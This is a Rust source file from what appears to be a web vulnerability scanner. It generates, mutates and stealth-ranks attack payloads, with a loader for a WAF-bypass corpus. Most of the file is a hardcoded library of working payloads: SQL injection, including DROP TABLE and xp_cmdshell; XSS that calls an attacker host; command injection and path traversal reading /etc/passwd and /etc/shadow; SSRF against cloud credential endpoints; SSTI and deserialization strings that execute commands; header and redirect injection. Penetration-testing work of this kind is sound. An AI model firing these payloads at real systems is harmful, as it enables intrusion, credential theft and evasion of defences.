use std::fs;
use std::path::Path;

use aegis_protocol::finding::VulnerabilityClass;
use rand::Rng;
use serde::{Deserialize, Serialize};
use serde_json::Value;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum StealthRating {
    High,
    Medium,
    Low,
}

#[derive(Debug, Clone)]
pub struct BypassPayload {
    pub raw: String,
    pub waf_targets: Vec<String>,
    pub technique: String,
    pub stealth_rating: StealthRating,
}

pub fn load_bypass_corpus(
    path: &Path,
) -> Result<Vec<(VulnerabilityClass, Vec<BypassPayload>)>, String> {
    let content = fs::read_to_string(path).map_err(|e| format!("failed to read file: {e}"))?;
    let root: Value =
        serde_json::from_str(&content).map_err(|e| format!("failed to parse JSON: {e}"))?;
    let payloads_obj = root
        .get("payloads")
        .and_then(|v| v.as_object())
        .ok_or_else(|| "missing or invalid 'payloads' object".to_string())?;

    let mut result = Vec::new();
    for (key, entries) in payloads_obj {
        let class = map_key_to_vulnerability_class(key)?;
        let items = entries
            .as_array()
            .ok_or_else(|| format!("expected array for key '{key}'"))?;
        let mut bypass_payloads = Vec::new();
        for item in items {
            bypass_payloads.push(parse_bypass_payload(item)?);
        }
        result.push((class, bypass_payloads));
    }
    Ok(result)
}

fn map_key_to_vulnerability_class(key: &str) -> Result<VulnerabilityClass, String> {
    match key {
        "SqlInjection" => Ok(VulnerabilityClass::SqlInjection),
        "CrossSiteScripting" => Ok(VulnerabilityClass::CrossSiteScripting),
        "CommandInjection" => Ok(VulnerabilityClass::CommandInjection),
        "PathTraversal" => Ok(VulnerabilityClass::PathTraversal),
        "ServerSideRequestForgery" => Ok(VulnerabilityClass::ServerSideRequestForgery),
        "InsecureDeserialization" => Ok(VulnerabilityClass::InsecureDeserialization),
        "BrokenAuthentication" => Ok(VulnerabilityClass::BrokenAuthentication),
        "BrokenAuthorization" => Ok(VulnerabilityClass::BrokenAuthorization),
        "SecurityMisconfiguration" => Ok(VulnerabilityClass::SecurityMisconfiguration),
        "SensitiveDataExposure" => Ok(VulnerabilityClass::SensitiveDataExposure),
        "ServerSideTemplateInjection" => Ok(VulnerabilityClass::ServerSideTemplateInjection),
        "HeaderInjection" => Ok(VulnerabilityClass::HeaderInjection),
        "OpenRedirect" => Ok(VulnerabilityClass::OpenRedirect),
        "CrlfInjection" => Ok(VulnerabilityClass::CrlfInjection),
        "KnownVulnerableDependency" => Ok(VulnerabilityClass::KnownVulnerableDependency),
        "InsufficientInputValidation" => Ok(VulnerabilityClass::InsufficientInputValidation),
        "NoSqlInjection" => Ok(VulnerabilityClass::NoSqlInjection),
        "XmlExternalEntity" => Ok(VulnerabilityClass::XmlExternalEntity),
        "CrossOriginMisconfiguration" => Ok(VulnerabilityClass::CrossOriginMisconfiguration),
        "MissingSecurityHeader" => Ok(VulnerabilityClass::MissingSecurityHeader),
        "JwtVulnerability" => Ok(VulnerabilityClass::JwtVulnerability),
        "HttpRequestSmuggling" => Ok(VulnerabilityClass::HttpRequestSmuggling),
        "RaceCondition" => Ok(VulnerabilityClass::RaceCondition),
        "SubdomainTakeover" => Ok(VulnerabilityClass::SubdomainTakeover),
        "PrototypePollution" => Ok(VulnerabilityClass::PrototypePollution),
        "GraphQlAbuse" => Ok(VulnerabilityClass::GraphQlAbuse),
        "CloudMisconfiguration" => Ok(VulnerabilityClass::CloudMisconfiguration),
        "Clickjacking" => Ok(VulnerabilityClass::Clickjacking),
        "CachePoisoning" => Ok(VulnerabilityClass::CachePoisoning),
        "HostHeaderInjection" => Ok(VulnerabilityClass::HostHeaderInjection),
        "InsecureDirectObjectReference" => Ok(VulnerabilityClass::InsecureDirectObjectReference),
        "InformationDisclosure" => Ok(VulnerabilityClass::InformationDisclosure),
        "WeakCryptography" => Ok(VulnerabilityClass::WeakCryptography),
        "MassAssignment" => Ok(VulnerabilityClass::MassAssignment),
        other => Err(format!("unknown vulnerability class: '{other}'")),
    }
}

fn parse_stealth_rating(value: &str) -> Result<StealthRating, String> {
    match value {
        "high" => Ok(StealthRating::High),
        "medium" => Ok(StealthRating::Medium),
        "low" => Ok(StealthRating::Low),
        other => Err(format!("unknown stealth_rating: '{other}'")),
    }
}

fn parse_bypass_payload(item: &Value) -> Result<BypassPayload, String> {
    let raw = item
        .get("raw")
        .and_then(|v| v.as_str())
        .ok_or_else(|| "missing 'raw' field".to_string())?
        .to_string();
    let waf_targets = item
        .get("waf_targets")
        .and_then(|v| v.as_array())
        .ok_or_else(|| "missing 'waf_targets' field".to_string())?
        .iter()
        .filter_map(|v| v.as_str().map(|s| s.to_string()))
        .collect();
    let technique = item
        .get("technique")
        .and_then(|v| v.as_str())
        .ok_or_else(|| "missing 'technique' field".to_string())?
        .to_string();
    let stealth_str = item
        .get("stealth_rating")
        .and_then(|v| v.as_str())
        .ok_or_else(|| "missing 'stealth_rating' field".to_string())?;
    let stealth_rating = parse_stealth_rating(stealth_str)?;
    Ok(BypassPayload {
        raw,
        waf_targets,
        technique,
        stealth_rating,
    })
}

#[derive(Debug, Clone)]
pub struct MutatedPayload {
    pub raw: String,
    pub vulnerability_class: VulnerabilityClass,
    pub mutation_strategy: MutationStrategy,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MutationStrategy {
    Template,
    Generative,
    BitFlip,
    Boundary,
}

impl std::fmt::Display for MutationStrategy {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let label = match self {
            Self::Template => "template",
            Self::Generative => "generative",
            Self::BitFlip => "bitflip",
            Self::Boundary => "boundary",
        };
        write!(f, "{label}")
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum MutationOrigin {
    Template,
    Generative,
    BitFlip,
    Boundary,
    BypassCorpus,
}

#[derive(Debug, Clone)]
pub struct TaggedPayload {
    pub payload: String,
    pub origin: MutationOrigin,
}

pub struct PayloadMutator {
    templates: Vec<(VulnerabilityClass, Vec<String>)>,
    bypass_corpus: Vec<(VulnerabilityClass, Vec<BypassPayload>)>,
}

impl PayloadMutator {
    pub fn new() -> Self {
        Self {
            templates: build_default_templates(),
            bypass_corpus: Vec::new(),
        }
    }

    pub fn with_bypass_corpus(
        mut self,
        corpus: Vec<(VulnerabilityClass, Vec<BypassPayload>)>,
    ) -> Self {
        self.bypass_corpus = corpus;
        self
    }

    pub fn generate_payloads(
        &self,
        class: VulnerabilityClass,
        count: usize,
    ) -> Vec<MutatedPayload> {
        let mut payloads = Vec::new();

        let class_templates: Vec<&str> = self
            .templates
            .iter()
            .filter(|(c, _)| *c == class)
            .flat_map(|(_, t)| t.iter().map(|s| s.as_str()))
            .collect();

        for template in class_templates.iter().take(count) {
            payloads.push(MutatedPayload {
                raw: template.to_string(),
                vulnerability_class: class,
                mutation_strategy: MutationStrategy::Template,
            });
        }

        if payloads.len() < count {
            append_corpus_payloads(&self.bypass_corpus, class, count, &mut payloads);
        }

        if payloads.len() < count {
            let remaining = count - payloads.len();
            for _ in 0..remaining {
                let base = if class_templates.is_empty() {
                    "FUZZ"
                } else {
                    class_templates[payloads.len() % class_templates.len()]
                };
                payloads.push(MutatedPayload {
                    raw: mutate_string(base),
                    vulnerability_class: class,
                    mutation_strategy: MutationStrategy::BitFlip,
                });
            }
        }

        payloads
    }

    pub fn generate_boundary_payloads(&self) -> Vec<MutatedPayload> {
        let boundaries: Vec<String> = vec![
            "".to_string(),
            " ".to_string(),
            "\0".to_string(),
            "\n".to_string(),
            "\r\n".to_string(),
            "A".repeat(1000),
            "A".repeat(10000),
            "-1".to_string(),
            "0".to_string(),
            "2147483647".to_string(),
            "-2147483648".to_string(),
            "9999999999999999999".to_string(),
            "null".to_string(),
            "undefined".to_string(),
            "true".to_string(),
            "false".to_string(),
            "[]".to_string(),
            "{}".to_string(),
            "NaN".to_string(),
            "Infinity".to_string(),
        ];

        boundaries
            .into_iter()
            .map(|raw| MutatedPayload {
                raw,
                vulnerability_class: VulnerabilityClass::SqlInjection,
                mutation_strategy: MutationStrategy::Boundary,
            })
            .collect()
    }

    pub fn generate_stealth_payloads(
        &self,
        class: VulnerabilityClass,
        count: usize,
    ) -> Vec<MutatedPayload> {
        let class_templates: Vec<&str> = self
            .templates
            .iter()
            .filter(|(c, _)| *c == class)
            .flat_map(|(_, t)| t.iter().map(|s| s.as_str()))
            .collect();

        let mut rated: Vec<(String, StealthRating)> = class_templates
            .iter()
            .map(|t| (t.to_string(), stealth_rating_for_template(t, class)))
            .collect();

        for (c, bypasses) in &self.bypass_corpus {
            if *c == class {
                for bp in bypasses {
                    rated.push((bp.raw.clone(), bp.stealth_rating));
                }
            }
        }

        rated.sort_by_key(|(_, r)| stealth_sort_key(*r));

        let mut payloads = Vec::new();
        for (raw, _) in rated.iter().take(count) {
            payloads.push(MutatedPayload {
                raw: raw.clone(),
                vulnerability_class: class,
                mutation_strategy: MutationStrategy::Template,
            });
        }

        if payloads.len() < count {
            let high_stealth: Vec<&str> = rated
                .iter()
                .filter(|(_, r)| *r == StealthRating::High)
                .map(|(t, _)| t.as_str())
                .collect();
            fill_stealth_overflow(&mut payloads, &high_stealth, class, count);
        }

        payloads
    }

    pub fn generate_tagged_payloads(
        &self,
        class: VulnerabilityClass,
        count: usize,
    ) -> Vec<TaggedPayload> {
        let mut payloads = Vec::new();

        let class_templates: Vec<&str> = self
            .templates
            .iter()
            .filter(|(c, _)| *c == class)
            .flat_map(|(_, t)| t.iter().map(|s| s.as_str()))
            .collect();

        for template in class_templates.iter().take(count) {
            payloads.push(TaggedPayload {
                payload: template.to_string(),
                origin: MutationOrigin::Template,
            });
        }

        if payloads.len() < count {
            append_tagged_corpus_payloads(&self.bypass_corpus, class, count, &mut payloads);
        }

        if payloads.len() < count {
            let remaining = count - payloads.len();
            for _ in 0..remaining {
                let base = if class_templates.is_empty() {
                    "FUZZ"
                } else {
                    class_templates[payloads.len() % class_templates.len()]
                };
                payloads.push(TaggedPayload {
                    payload: mutate_string(base),
                    origin: MutationOrigin::BitFlip,
                });
            }
        }

        payloads
    }

    pub fn template_count(&self, class: VulnerabilityClass) -> usize {
        self.templates
            .iter()
            .filter(|(c, _)| *c == class)
            .map(|(_, t)| t.len())
            .sum()
    }
}

impl Default for PayloadMutator {
    fn default() -> Self {
        Self::new()
    }
}

fn mutate_string(input: &str) -> String {
    let mut rng = rand::rng();
    let mut chars: Vec<char> = input.chars().collect();

    if chars.is_empty() {
        return "FUZZ".to_string();
    }

    let mutations = rng.random_range(1..=3);
    for _ in 0..mutations {
        let idx = rng.random_range(0..chars.len());
        let mutation_type = rng.random_range(0..3);
        match mutation_type {
            0 => chars[idx] = (rng.random_range(32u8..127u8)) as char,
            1 => chars.insert(idx, (rng.random_range(32u8..127u8)) as char),
            _ => {
                chars.remove(idx);
                if chars.is_empty() {
                    chars.push('X');
                }
            }
        }
    }

    chars.into_iter().collect()
}

fn build_default_templates() -> Vec<(VulnerabilityClass, Vec<String>)> {
    vec![
        (
            VulnerabilityClass::SqlInjection,
            vec![
                // Classic tautology
                "' OR '1'='1".to_string(),
                "' OR '1'='1' --".to_string(),
                "' OR ''='".to_string(),
                "\" OR \"\"=\"".to_string(),
                // Destructive / stacked queries
                "'; DROP TABLE users; --".to_string(),
                "1; EXEC xp_cmdshell('id')--".to_string(),
                "'; WAITFOR DELAY '0:0:5'; --".to_string(),
                // UNION-based
                "1 UNION SELECT null,null,null--".to_string(),
                "-1 UNION SELECT username,password FROM users--".to_string(),
                "' UNION SELECT NULL,table_name FROM information_schema.tables--".to_string(),
                "1 UNION ALL SELECT NULL,NULL,NULL,NULL--".to_string(),
                // Boolean blind
                "' AND 1=1--".to_string(),
                "' AND 1=2--".to_string(),
                "' AND substring(version(),1,1)='5'--".to_string(),
                // Order-by probing
                "1' ORDER BY 1--".to_string(),
                "1' ORDER BY 100--".to_string(),
                // Time-based blind (MySQL)
                "' WAITFOR DELAY '0:0:5'--".to_string(),
                "1' AND (SELECT SLEEP(5))--".to_string(),
                "1' AND BENCHMARK(10000000,SHA1('test'))--".to_string(),
                // Time-based blind (PostgreSQL)
                "1; SELECT pg_sleep(5)--".to_string(),
                "' OR pg_sleep(5)::text='1'--".to_string(),
                // Error-based (MySQL)
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--".to_string(),
                // Error-based (MSSQL)
                "1 AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--".to_string(),
                // SQLite specific
                "' AND 1=randomblob(100000000)--".to_string(),
            ],
        ),
        (
            VulnerabilityClass::CrossSiteScripting,
            vec![
                // Classic reflected
                "<script>alert(1)</script>".to_string(),
                "<img src=x onerror=alert(1)>".to_string(),
                "<svg onload=alert(1)>".to_string(),
                "javascript:alert(1)".to_string(),
                "'\"><script>alert(1)</script>".to_string(),
                "<body onload=alert(1)>".to_string(),
                // Event handler variants
                "<details open ontoggle=alert(1)>".to_string(),
                "<input onfocus=alert(1) autofocus>".to_string(),
                "<marquee onstart=alert(1)>".to_string(),
                "<video src=x onerror=alert(1)>".to_string(),
                // DOM / mutation XSS
                "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>".to_string(),
                "<iframe srcdoc='<script>alert(1)</script>'>".to_string(),
                "<svg><animate onbegin=alert(1) attributeName=x>".to_string(),
                // Attribute injection / breakout
                "\"><svg/onload=fetch('//attacker')>".to_string(),
                "'-alert(1)-'".to_string(),
                "\" onmouseover=\"alert(1)".to_string(),
                // Template literal / polyglot
                "${alert(1)}".to_string(),
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//".to_string(),
            ],
        ),
        (
            VulnerabilityClass::CommandInjection,
            vec![
                // Unix shell metacharacters
                "; id".to_string(),
                "| id".to_string(),
                "$(id)".to_string(),
                "`id`".to_string(),
                "; cat /etc/passwd".to_string(),
                "& whoami".to_string(),
                // Time-based / out-of-band
                "$(sleep 5)".to_string(),
                "| sleep 5 #".to_string(),
                ";ping -c 5 127.0.0.1".to_string(),
                "`sleep 5`".to_string(),
                // Newline injection
                "\nid\n".to_string(),
                "\r\nid\r\n".to_string(),
                // Shell globbing / bracket
                "a]b[$(id)".to_string(),
                "$(cat</etc/passwd)".to_string(),
                // Windows variants
                "& dir C:\\".to_string(),
                "| type C:\\Windows\\win.ini".to_string(),
                // Encoding bypass
                ";{id}".to_string(),
                "|| id".to_string(),
            ],
        ),
        (
            VulnerabilityClass::PathTraversal,
            vec![
                // Basic Unix
                "../../../etc/passwd".to_string(),
                "../../../../etc/shadow".to_string(),
                "../../../etc/hosts".to_string(),
                // Basic Windows
                "..\\..\\..\\windows\\system32\\config\\sam".to_string(),
                "..\\..\\..\\windows\\win.ini".to_string(),
                // Collapsed-slash bypass
                "....//....//....//etc/passwd".to_string(),
                "....\\\\....\\\\....\\\\etc/passwd".to_string(),
                // URL-encoded
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd".to_string(),
                "/%2e%2e/%2e%2e/%2e%2e/etc/passwd".to_string(),
                // Double-encoded
                "..%252f..%252f..%252fetc/passwd".to_string(),
                "..%252e%252e%252fetc/passwd".to_string(),
                // Overlong UTF-8
                "..%c0%afetc/passwd".to_string(),
                "..%ef%bc%8fetc/passwd".to_string(),
                // Null byte truncation
                "/etc/passwd%00".to_string(),
                "/etc/passwd%00.png".to_string(),
            ],
        ),
        (
            VulnerabilityClass::ServerSideRequestForgery,
            vec![
                // Standard loopback
                "http://127.0.0.1".to_string(),
                "http://localhost".to_string(),
                "http://0.0.0.0".to_string(),
                "http://[::1]".to_string(),
                // Cloud metadata
                "http://169.254.169.254/latest/meta-data/".to_string(),
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/".to_string(),
                // Alternative IP representations
                "http://0x7f000001".to_string(),
                "http://2130706433".to_string(),
                "http://017700000001".to_string(),
                "http://127.1".to_string(),
                // Internal service ports
                "http://127.0.0.1:6379".to_string(),
                "http://127.0.0.1:11211".to_string(),
                // DNS rebinding / domain confusion
                "http://localtest.me".to_string(),
                "http://127.0.0.1.nip.io".to_string(),
                // Protocol smuggling
                "gopher://127.0.0.1:25/".to_string(),
            ],
        ),
        (
            VulnerabilityClass::ServerSideTemplateInjection,
            vec![
                // Detection probes
                "{{7*7}}".to_string(),
                "${7*7}".to_string(),
                "<%= 7*7 %>".to_string(),
                "#{7*7}".to_string(),
                "{{config}}".to_string(),
                // Jinja2 / Python
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}".to_string(),
                "{{''.__class__.__mro__[1].__subclasses__()}}".to_string(),
                "{% for x in ().__class__.__base__.__subclasses__() %}{{x.__name__}}{% endfor %}".to_string(),
                // Spring / Java EL
                "#{T(java.lang.Runtime).getRuntime().exec('id')}".to_string(),
                "${T(java.lang.Runtime).getRuntime().exec('id')}".to_string(),
                // Freemarker
                "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex('id')}".to_string(),
                // Velocity
                "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))".to_string(),
                // Twig
                "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}".to_string(),
                // ERB / Ruby
                "<%= system('id') %>".to_string(),
                "<%= `id` %>".to_string(),
            ],
        ),
        (
            VulnerabilityClass::HeaderInjection,
            vec![
                "value\r\nInjected-Header: true".to_string(),
                "value\nX-Injected: yes".to_string(),
                "value\r\nSet-Cookie: session=hijacked".to_string(),
                "value\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK".to_string(),
                "value%0d%0aX-Injected: yes".to_string(),
                "value\r\nX-Forwarded-For: 127.0.0.1".to_string(),
            ],
        ),
        (
            VulnerabilityClass::OpenRedirect,
            vec![
                // Protocol-relative
                "//evil.com".to_string(),
                "//evil.com/%2f..".to_string(),
                // Absolute URL
                "https://evil.com".to_string(),
                "http://evil.com".to_string(),
                // Backslash confusion
                "/\\evil.com".to_string(),
                "\\\\evil.com".to_string(),
                // URL encoding tricks
                "/%09/evil.com".to_string(),
                "//%0d%0aevil.com".to_string(),
                // At-sign confusion
                "http://trusted.com@evil.com".to_string(),
                // Data URI
                "data:text/html,<script>alert(1)</script>".to_string(),
                // Whitespace prefix
                " https://evil.com".to_string(),
                "\thttps://evil.com".to_string(),
            ],
        ),
        (
            VulnerabilityClass::CrlfInjection,
            vec![
                "%0d%0aSet-Cookie:evil=true".to_string(),
                "\r\nLocation: http://evil.com".to_string(),
                "%0aSet-Cookie:evil=true".to_string(),
                "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>".to_string(),
                "\r\nX-Injected: true".to_string(),
                "%0d%0aX-Forwarded-For: 127.0.0.1".to_string(),
            ],
        ),
        (
            VulnerabilityClass::InsecureDeserialization,
            vec![
                // Java serialized object (base64 prefix)
                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==".to_string(),
                // PHP object injection
                "O:8:\"stdClass\":0:{}".to_string(),
                // .NET type confusion
                "{\"__type\":\"System.Windows.Data.ObjectDataProvider\"}".to_string(),
                // Node.js node-serialize RCE
                "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}".to_string(),
                // Python pickle (cos\nsystem)
                "cos\nsystem\n(S'id'\ntR.".to_string(),
                // Python yaml.load (PyYAML < 6.0)
                "!!python/object/apply:os.system ['id']".to_string(),
                // PHP phar deserialization trigger
                "phar://./uploads/evil.phar/test".to_string(),
                // Ruby Marshal
                "BAhJIgpIZWxsbwY6BkVU".to_string(),
                // Java (ysoserial CommonsBeanutils1 marker)
                "aced0005737200176f72672e6170616368652e636f6d6d6f6e73".to_string(),
            ],
        ),
        (
            VulnerabilityClass::NoSqlInjection,
            vec![
                // MongoDB operator injection (JSON body)
                "{\"$ne\": \"\"}".to_string(),
                "{\"$gt\": \"\"}".to_string(),
                "{\"$regex\": \".*\"}".to_string(),
                "{\"$where\": \"1==1\"}".to_string(),
                "{\"$where\": \"sleep(5000)\"}".to_string(),
                "{\"$nin\": []}".to_string(),
                "{\"username\": {\"$regex\": \"^a\"}}".to_string(),
                // MongoDB operator injection (URL parameter form)
                "username[$ne]=&password[$ne]=".to_string(),
                "username[$gt]=&password[$gt]=".to_string(),
                "username[$regex]=.*&password[$regex]=.*".to_string(),
                "[$ne]=&password[$ne]=".to_string(),
                // Cassandra CQL injection
                "' OR 1=1 ALLOW FILTERING--".to_string(),
            ],
        ),
    ]
}

pub fn stealth_rating_for_template(template: &str, _class: VulnerabilityClass) -> StealthRating {
    let lower = template.to_lowercase();
    if is_high_stealth(&lower) {
        return StealthRating::High;
    }
    if is_medium_stealth(template) {
        return StealthRating::Medium;
    }
    StealthRating::Low
}

fn is_high_stealth(lower: &str) -> bool {
    let blind_keywords = [
        "sleep",
        "waitfor",
        "pg_sleep",
        "benchmark",
        "delay",
        "ping",
        "dns",
        "oob",
        "time-based",
    ];
    blind_keywords.iter().any(|kw| lower.contains(kw))
}

fn is_medium_stealth(template: &str) -> bool {
    let lower = template.to_lowercase();
    let encoding_patterns = ["%2e", "%2f", "%0d", "%0a", "%00", "%25"];
    if encoding_patterns.iter().any(|p| lower.contains(p)) {
        return true;
    }
    has_mixed_case_keywords(template)
}

fn has_mixed_case_keywords(template: &str) -> bool {
    let keywords = ["select", "union", "script", "alert", "sleep"];
    for kw in &keywords {
        if let Some(pos) = template.to_lowercase().find(kw) {
            let original_fragment = &template[pos..pos + kw.len()];
            let has_upper = original_fragment.chars().any(|c| c.is_uppercase());
            let has_lower = original_fragment.chars().any(|c| c.is_lowercase());
            if has_upper && has_lower {
                return true;
            }
        }
    }
    false
}

fn stealth_sort_key(rating: StealthRating) -> u8 {
    match rating {
        StealthRating::High => 0,
        StealthRating::Medium => 1,
        StealthRating::Low => 2,
    }
}

fn fill_stealth_overflow(
    payloads: &mut Vec<MutatedPayload>,
    high_stealth: &[&str],
    class: VulnerabilityClass,
    count: usize,
) {
    let remaining = count - payloads.len();
    for i in 0..remaining {
        let base = if high_stealth.is_empty() {
            "FUZZ"
        } else {
            high_stealth[i % high_stealth.len()]
        };
        payloads.push(MutatedPayload {
            raw: mutate_string(base),
            vulnerability_class: class,
            mutation_strategy: MutationStrategy::Generative,
        });
    }
}

fn append_corpus_payloads(
    bypass_corpus: &[(VulnerabilityClass, Vec<BypassPayload>)],
    class: VulnerabilityClass,
    count: usize,
    payloads: &mut Vec<MutatedPayload>,
) {
    for (c, bypasses) in bypass_corpus {
        if *c == class {
            for bp in bypasses {
                if payloads.len() >= count {
                    return;
                }
                payloads.push(MutatedPayload {
                    raw: bp.raw.clone(),
                    vulnerability_class: class,
                    mutation_strategy: MutationStrategy::Template,
                });
            }
        }
    }
}

fn append_tagged_corpus_payloads(
    bypass_corpus: &[(VulnerabilityClass, Vec<BypassPayload>)],
    class: VulnerabilityClass,
    count: usize,
    payloads: &mut Vec<TaggedPayload>,
) {
    for (c, bypasses) in bypass_corpus {
        if *c == class {
            for bp in bypasses {
                if payloads.len() >= count {
                    return;
                }
                payloads.push(TaggedPayload {
                    payload: bp.raw.clone(),
                    origin: MutationOrigin::BypassCorpus,
                });
            }
        }
    }
}
